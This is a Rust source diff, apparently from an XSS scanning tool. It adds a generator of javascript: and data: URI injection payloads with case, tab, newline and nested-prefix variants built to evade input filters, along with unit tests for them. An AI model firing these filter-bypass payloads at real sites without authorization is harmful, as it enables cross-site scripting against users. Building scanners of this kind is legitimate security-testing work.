@@ -76,6 +76,39 @@ pub fn get_mxss_payloads() -> Vec<String> {
     out
 }
 
+/// Generate protocol-based injection payloads for src/href attributes
+/// (iframe, embed, object, a href, etc.)
+/// These target contexts where a parameter value is placed directly into a `src` or `href`
+/// attribute, allowing `javascript:` or `data:` URI execution.
+pub fn get_protocol_injection_payloads() -> Vec<String> {
+    let mut out = Vec::new();
+    let js_payloads = crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL;
+
+    for js in js_payloads.iter() {
+        // javascript: protocol variants
+        out.push(format!("javascript:{}", js));
+        out.push(format!("Javascript:{}", js)); // capitalized case variation
+        out.push(format!("jAvAsCrIpT:{}", js)); // mixed case
+        out.push(format!("java\tscript:{}", js)); // tab insertion to bypass naive filter
+        out.push(format!("java\nscript:{}", js)); // newline insertion
+        out.push(format!("javascript\t:{}", js)); // tab before colon
+        out.push(format!("\tjavascript:{}", js)); // leading tab
+        out.push(format!("\njavascript:{}", js)); // leading newline
+        // Double-nested javascript: to bypass single-pass removal (e.g. "jajavascriptvascript:")
+        out.push(format!("javas\tcript:{}", js));
+        out.push(format!("javasscriptcript:{}", js)); // bypass gsub("javascript","")
+        out.push(format!("javascriptjavascript:{}", js)); // double prefix to survive one-pass strip
+
+        // data: protocol variants
+        out.push(format!("data:text/html,<script>{}</script>", js));
+        out.push(format!(
+            "data:text/html;base64,{}",
+            crate::encoding::base64_encode(&format!("<script>{}</script>", js))
+        ));
+    }
+    out
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -126,7 +159,9 @@ mod tests {
     fn test_get_mxss_payloads_contains_svg_foreignobject() {
         let payloads = get_mxss_payloads();
         assert!(
-            payloads.iter().any(|p| p.contains("foreignobject") || p.contains("foreignObject")),
+            payloads
+                .iter()
+                .any(|p| p.contains("foreignobject") || p.contains("foreignObject")),
             "should contain SVG foreignObject payloads"
         );
     }
@@ -147,6 +182,70 @@ mod tests {
         let idm = crate::scanning::markers::id_marker();
         let has_marker = payloads.iter().any(|p| p.contains(cls) || p.contains(idm));
         assert!(has_marker, "mXSS payloads should contain class/id markers");
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_non_empty() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            !payloads.is_empty(),
+            "protocol injection payloads should not be empty"
+        );
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_contains_javascript_protocol() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            payloads.iter().any(|p| p.starts_with("javascript:")),
+            "should contain javascript: protocol payloads"
+        );
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_contains_case_variations() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            payloads.iter().any(|p| p.starts_with("Javascript:")),
+            "should contain capitalized javascript: variant"
+        );
+        assert!(
+            payloads.iter().any(|p| p.starts_with("jAvAsCrIpT:")),
+            "should contain mixed case javascript: variant"
+        );
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_contains_tab_bypass() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            payloads.iter().any(|p| p.contains("java\tscript:")),
+            "should contain tab-inserted javascript: variant"
+        );
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_contains_data_protocol() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            payloads.iter().any(|p| p.starts_with("data:text/html,")),
+            "should contain data: text/html payloads"
+        );
+        assert!(
+            payloads
+                .iter()
+                .any(|p| p.starts_with("data:text/html;base64,")),
+            "should contain data: base64 payloads"
+        );
+    }
+
+    #[test]
+    fn test_get_protocol_injection_payloads_contains_alert() {
+        let payloads = get_protocol_injection_payloads();
+        assert!(
+            payloads.iter().any(|p| p.contains("alert(1)")),
+            "should include at least one alert(1) variant"
+        );
     }
 
     #[test]
